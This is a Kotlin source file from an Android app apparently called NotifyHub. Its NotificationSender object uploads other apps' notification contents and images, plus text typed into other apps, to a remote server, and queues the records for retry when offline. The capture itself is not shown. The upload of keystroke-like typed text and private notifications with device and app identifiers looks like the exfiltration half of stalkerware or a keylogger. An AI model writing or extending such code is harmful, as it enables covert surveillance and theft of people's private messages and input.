package com.notifyhub

import com.notifyhub.data.PendingNotification
import com.notifyhub.data.PendingTypedText
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object NotificationSender {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    fun sendOrQueue(payload: PendingNotification, imageData: String? = null) {
        CoroutineScope(Dispatchers.IO).launch {
            val sent = post(payload, imageData)
            if (!sent) {
                val dao = App.database.dao()
                if (dao.count() >= 1000) dao.dropOldest(100)
                dao.insert(payload)
            }
        }
    }

    fun sendTypedText(
        deviceId: String,
        packageName: String,
        appLabel: String,
        text: String,
        capturedAt: String
    ) {
        CoroutineScope(Dispatchers.IO).launch {
            val item = PendingTypedText(
                deviceId    = deviceId,
                packageName = packageName,
                appLabel    = appLabel,
                text        = text,
                capturedAt  = capturedAt
            )
            if (!postTypedText(item)) {
                // Queue for retry when the server is unreachable (e.g. cold start).
                val dao = App.database.dao()
                if (dao.countText() >= 1000) dao.dropOldestText(100)
                dao.insertText(item)
            }
        }
    }

    suspend fun drainQueue() {
        val dao = App.database.dao()
        for (item in dao.getPending()) {
            if (post(item)) {
                dao.delete(item.id)
            } else {
                dao.incrementAttempts(item.id)
            }
        }
        for (item in dao.getPendingText()) {
            if (postTypedText(item)) {
                dao.deleteText(item.id)
            } else {
                dao.incrementAttemptsText(item.id)
            }
        }
    }

    private fun postTypedText(item: PendingTypedText): Boolean {
        return try {
            val json = JSONObject().apply {
                put("deviceId",    item.deviceId)
                put("packageName", item.packageName)
                put("appLabel",    item.appLabel)
                put("text",        item.text)
                put("capturedAt",  item.capturedAt)
            }
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${BuildConfig.SERVER_URL}/api/typed-text")
                .header("X-API-Key", BuildConfig.API_KEY)
                .post(body)
                .build()
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }

    private fun post(payload: PendingNotification, imageData: String? = null): Boolean {
        return try {
            val json = JSONObject().apply {
                put("deviceId",    payload.deviceId)
                put("packageName", payload.packageName)
                put("appLabel",    payload.appLabel)
                put("title",       payload.title)
                put("textBody",    payload.textBody)
                put("bigText",     payload.bigText)
                put("subText",     payload.subText)
                put("postedAt",    payload.postedAt)
                put("dedupHash",   payload.dedupHash)
                if (imageData != null) put("imageData", imageData)
            }
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${BuildConfig.SERVER_URL}/api/notifications")
                .header("X-API-Key", BuildConfig.API_KEY)
                .post(body)
                .build()
            client.newCall(request).execute().use { response ->
                // 409 = server-side deduplicated; treat as success, don't retry
                response.isSuccessful || response.code == 409
            }
        } catch (_: Exception) {
            false
        }
    }
}
